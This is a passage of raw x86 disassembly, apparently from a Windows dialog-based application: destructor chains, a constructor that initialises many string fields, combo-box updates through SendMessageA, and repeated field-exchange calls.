mov [ esp + 0x34c ] 0x40
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x34c ] 0x3f
call sub_442148
lea ecx [ esp + 0x218 ]
mov [ esp + 0x34c ] 0x3e
call sub_442148
mov [ esp + 0x34c ] 0x3d
lea ecx [ esp + 0x214 ]
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x34c ] 0x3c
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x34c ] 0x3b
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x34c ] 0x3a
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x34c ] 0x39
call sub_442148
lea ecx [ esp + 0x200 ]
mov [ esp + 0x34c ] 0x38
call sub_442148
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x34c ] 0x37
call sub_442148
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x34c ] 0x36
call sub_442148
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x34c ] 0x35
call sub_442148
lea ecx [ esp + 0x1f0 ]
mov [ esp + 0x34c ] 0x34
call sub_442148
lea ecx [ esp + 0x1ec ]
mov [ esp + 0x34c ] 0x33
call sub_442148
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x34c ] 0x32
call sub_442148
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x34c ] 0x31
call sub_442148
lea ecx [ esp + 0x1e0 ]
mov [ esp + 0x34c ] 0x30
call sub_442148
lea ecx [ esp + 0x1dc ]
mov [ esp + 0x34c ] 0x2f
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x34c ] 0x2e
call sub_442148
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x34c ] 0x2d
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x34c ] 0x2c
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x34c ] 0x2b
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x34c ] 0x2a
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x34c ] 0x29
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x34c ] 0x28
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x34c ] 0x27
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x34c ] 0x26
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x34c ] 0x25
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x34c ] 0x24
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x34c ] 0x23
call sub_442148
mov [ esp + 0x34c ] 0x22
lea ecx [ esp + 0x1a8 ]
call sub_442148
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x34c ] 0x21
call sub_442148
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x34c ] 0x20
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x34c ] 0x1f
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x34c ] 0x1e
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x34c ] 0x1d
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x34c ] 0x1c
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x34c ] 0x1b
call sub_442148
lea ecx [ esp + 0x188 ]
mov [ esp + 0x34c ] 0x1a
call sub_442148
lea ecx [ esp + 0x184 ]
mov [ esp + 0x34c ] 0x19
call sub_442148
lea ecx [ esp + 0x180 ]
mov [ esp + 0x34c ] 0x18
call sub_442148
lea ecx [ esp + 0x17c ]
mov [ esp + 0x34c ] 0x17
call sub_442148
lea ecx [ esp + 0x178 ]
mov [ esp + 0x34c ] 0x16
call sub_442148
lea ecx [ esp + 0x174 ]
mov [ esp + 0x34c ] 0x15
call sub_442148
lea ecx [ esp + 0x170 ]
mov [ esp + 0x34c ] 0x14
call sub_442148
lea ecx [ esp + 0x16c ]
mov [ esp + 0x34c ] 0x13
call sub_442148
lea ecx [ esp + 0x168 ]
mov [ esp + 0x34c ] 0x12
call sub_442148
lea ecx [ esp + 0x164 ]
mov [ esp + 0x34c ] 0x11
call sub_442148
lea ecx [ esp + 0x160 ]
mov [ esp + 0x34c ] 0x10
call sub_442148
lea ecx [ esp + 0x15c ]
mov [ esp + 0x34c ] 0xf
call sub_442148
lea ecx [ esp + 0x158 ]
mov [ esp + 0x34c ] 0xe
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x34c ] 0xd
call sub_442148
lea ecx [ esp + 0x144 ]
mov [ esp + 0x34c ] 0xc
call sub_442148
lea ecx [ esp + 0x140 ]
mov [ esp + 0x34c ] 0xb
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x34c ] 0xa
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x34c ] 0x9
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x34c ] 0x8
call sub_442148
mov [ esp + 0x34c ] 0x7
lea ecx [ esp + 0x130 ]
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x34c ] 0x6
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x34c ] 0x5
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x34c ] 0x4
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x34c ] 0x3
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x34c ] 0x1
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x34c ] bl
call sub_442148
lea ecx [ esp + 0x340 ]
mov [ esp + 0x34c ] 0x44
call sub_442148
lea ecx [ esp + 0x33c ]
mov [ esp + 0x34c ] 0x43
call sub_442148
lea ecx [ esp + 0x338 ]
mov [ esp + 0x34c ] 0x42
call sub_442148
lea ecx [ esp + 0x228 ]
mov [ esp + 0x34c ] 0xffffffff
call sub_421723
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x344 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x344
retn
sub_41e110
push 0xffffffff
push sub_462a5c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x124
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0xb4 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push ecx
mov [ esp + 0x148 ] 0x0
call edi
test eax eax
jle r-xdata
mov eax [ esi + 0x12c ]
push 0x0
push 0x0
push 0x146
push eax
call edi
test eax eax
jle r-xdata
mov ebp eax
push 0x0
lea ecx [ esp + 0x14 ]
call sub_413100
mov edx [ esi + 0x150 ]
lea eax [ esp + 0xc ]
push edx
push rw-data
push eax
mov [ esp + 0x144 ] 0x1
call sub_43b5cc
mov ecx [ esp + 0x18 ]
add esp 0xc
or ebp 0xffffffff
push 0x0
push ecx
push ebp
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov ebp eax
mov edx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x144
push edx
call edi
dec ebp
jne r-xdata
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x12c ]
mov [ esp + 0x138 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x138 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x138 ] 0x3
call sub_442148
mov [ esp + 0x138 ] 0x2
jmp r-xdata
mov ecx [ esi + 0x12c ]
push 0x0
push 0x0
push 0x144
push ecx
call edi
dec ebp
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x12c ]
mov [ esp + 0x138 ] 0x9
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x138 ] 0x8
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x138 ] 0x7
call sub_442148
mov [ esp + 0x138 ] 0x6
mov edx [ esp + 0x124 ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x138 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x138 ] ebp
call sub_442148
mov ecx [ esp + 0x130 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x130
retn
sub_41e320
push 0xffffffff
push sub_462aec
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0x12c ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x146
push ecx
mov [ esp + 0x150 ] 0x0
call edi
test eax eax
jle r-xdata
push 0x0
lea ecx [ esp + 0x14 ]
call sub_40a470
mov eax [ esi + 0x158 ]
mov ecx [ esi + 0x150 ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
mov [ esp + 0x150 ] 0x1
call sub_43b5cc
mov eax [ esp + 0x1c ]
add esp 0x10
or ebp 0xffffffff
lea ecx [ esp + 0x10 ]
push 0x0
push eax
push ebp
call sub_42182c
test eax eax
jne r-xdata
mov ebp eax
mov eax [ esp + 0xd8 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0x6
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x3
call sub_442148
mov [ esp + 0x140 ] 0x2
jmp r-xdata
mov edx [ esi + 0x12c ]
push 0x0
push 0x0
push 0x144
push edx
call edi
dec ebp
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_421900
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0xd
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0xc
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0xb
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0xa
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x9
call sub_442148
mov [ esp + 0x140 ] 0x8
mov ecx [ esp + 0x124 ]
mov edx [ esi + 0x12c ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ eax + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] ebp
call sub_442148
mov ecx [ esp + 0x138 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
sub_41e560
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_462b16
push eax
mov [ fs : 0x0 ] esp
sub esp 0x21c
push ebx
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x248 ]
xor ebx ebx
cmp [ eax - 0x8 ] ebx
jne r-xdata
mov ecx [ esi + 0x24c ]
cmp [ ecx - 0x8 ] ebx
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
pop esi
pop ebx
mov ecx [ esp + 0x21c ]
mov [ fs : 0x0 ] ecx
add esp 0x228
retn
cmp [ esi + 0x250 ] ebx
je r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
pop esi
pop ebx
mov ecx [ esp + 0x21c ]
mov [ fs : 0x0 ] ecx
add esp 0x228
retn
mov ecx esi
call sub_43e178
mov ecx [ esp + 0x224 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x228
retn
push ebx
lea ecx [ esp + 0x10 ]
call sub_41e710
mov edx [ rw-data ]
mov [ esp + 0x22c ] ebx
mov [ esp + 0x8 ] edx
mov eax [ esi + 0x248 ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x238 ] 0x1
call sub_43b5cc
mov edx [ esp + 0x14 ]
add esp 0xc
lea ecx [ esp + 0xc ]
push ebx
push edx
push 0xffffffff
call sub_42182c
test eax eax
jne r-xdata
cmp [ esp + 0xa8 ] ebx
je r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0xc ]
call sub_421900
lea ecx [ esp + 0x8 ]
mov [ esp + 0x22c ] bl
call sub_442148
lea ecx [ esp + 0xc ]
mov [ esp + 0x22c ] 0xffffffff
call sub_410040
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc ]
call sub_421900
lea ecx [ esp + 0x8 ]
mov [ esp + 0x22c ] bl
call sub_442148
lea ecx [ esp + 0xc ]
mov [ esp + 0x22c ] 0xffffffff
call sub_410040
pop esi
pop ebx
mov ecx [ esp + 0x21c ]
mov [ fs : 0x0 ] ecx
add esp 0x228
retn
sub_41e710
push 0xffffffff
push sub_462e9a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x118 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x11c ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
mov eax [ rw-data ]
mov [ esi + 0x124 ] eax
mov edx [ rw-data ]
mov [ esi + 0x128 ] edx
mov eax [ rw-data ]
mov [ esi + 0x12c ] eax
mov edx [ rw-data ]
mov [ esi + 0x130 ] edx
mov eax [ rw-data ]
mov [ esi + 0x134 ] eax
mov edx [ rw-data ]
mov [ esi + 0x140 ] edx
mov eax [ rw-data ]
mov [ esi + 0x148 ] eax
mov edx [ rw-data ]
mov [ esi + 0x14c ] edx
mov eax [ rw-data ]
mov [ esi + 0x150 ] eax
mov edx [ rw-data ]
mov [ esi + 0x154 ] edx
mov eax [ rw-data ]
mov [ esi + 0x158 ] eax
mov edx [ rw-data ]
mov [ esi + 0x15c ] edx
mov eax [ rw-data ]
mov [ esi + 0x160 ] eax
mov edx [ rw-data ]
mov [ esi + 0x164 ] edx
mov eax [ rw-data ]
mov [ esi + 0x168 ] eax
mov edx [ rw-data ]
mov [ esi + 0x16c ] edx
mov eax [ rw-data ]
mov [ esi + 0x170 ] eax
mov edx [ rw-data ]
mov [ esi + 0x174 ] edx
mov eax [ rw-data ]
mov [ esi + 0x178 ] eax
mov edx [ rw-data ]
mov [ esi + 0x17c ] edx
mov eax [ rw-data ]
mov [ esi + 0x180 ] eax
mov edx [ rw-data ]
mov [ esi + 0x184 ] edx
mov eax [ rw-data ]
mov [ esi + 0x188 ] eax
mov edx [ rw-data ]
mov [ esi + 0x18c ] edx
mov eax [ rw-data ]
mov [ esi + 0x190 ] eax
mov edx [ rw-data ]
mov [ esi + 0x194 ] edx
mov eax [ rw-data ]
mov [ esi + 0x198 ] eax
mov edx [ rw-data ]
mov [ esi + 0x19c ] edx
mov eax [ rw-data ]
mov [ esi + 0x1a0 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1a4 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1a8 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1ac ] edx
mov eax [ rw-data ]
mov [ esi + 0x1b0 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1b4 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1b8 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1bc ] edx
mov eax [ rw-data ]
mov [ esi + 0x1c0 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1c4 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1c8 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1cc ] edx
mov eax [ rw-data ]
mov [ esi + 0x1d0 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1d4 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1d8 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1dc ] edx
mov eax [ rw-data ]
mov [ esi + 0x1e0 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1e4 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1e8 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1ec ] edx
mov eax [ rw-data ]
mov [ esi + 0x1f0 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1f4 ] edx
mov eax [ rw-data ]
mov [ esi + 0x1f8 ] eax
mov edx [ rw-data ]
mov [ esi + 0x1fc ] edx
mov eax [ rw-data ]
mov [ esi + 0x200 ] eax
mov edx [ rw-data ]
mov [ esi + 0x204 ] edx
mov eax [ rw-data ]
mov [ esi + 0x208 ] eax
mov edx [ rw-data ]
mov [ esi + 0x20c ] edx
mov eax [ rw-data ]
mov [ esi + 0x210 ] eax
mov edx [ rw-data ]
mov [ esi + 0x214 ] edx
push rw-data
mov [ esp + 0x20 ] 0x3f
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x128 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x12c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x130 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x134 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x140 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x148 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x14c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x150 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x154 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x158 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x15c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x160 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x164 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x168 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x16c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x170 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x174 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x178 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x17c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x180 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x184 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x188 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x18c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x190 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x194 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x198 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x19c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1a0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1a4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1a8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1ac ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1b0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1b4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1b8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1bc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1c8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1cc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1d8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1dc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1e0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1e4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1e8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1ec ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1f0 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1f4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1f8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x1fc ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x200 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x204 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x210 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x214 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x42
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_41ee90
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x124 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x128 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x12c ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x130 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
push 0xff
lea eax [ esi + 0x134 ]
push eax
push rw-data
push edi
call sub_4246fa
lea ecx [ esi + 0x138 ]
push ecx
push rw-data
push edi
call sub_424cfa
lea edx [ esi + 0x13c ]
push edx
push rw-data
push edi
call sub_424cfa
push 0x0
push 0xc
lea eax [ esi + 0x140 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
lea ecx [ esi + 0x144 ]
push ecx
push rw-data
push edi
call sub_424cfa
push 0x0
push 0xc
lea edx [ esi + 0x148 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x14c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x150 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x154 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x158 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x15c ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x160 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x164 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x168 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x16c ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x170 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x174 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x178 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x17c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x180 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x184 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x188 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x18c ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x190 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x194 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x198 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x19c ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1a0 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1a4 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1a8 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1ac ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1b0 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1b4 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1b8 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1bc ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1c0 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1c4 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1c8 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1cc ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1d0 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1d4 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1d8 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1dc ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1e0 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1e4 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1e8 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1ec ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1f0 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x1f4 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x1f8 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x1fc ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x200 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x204 ]
push 0xff
push ecx
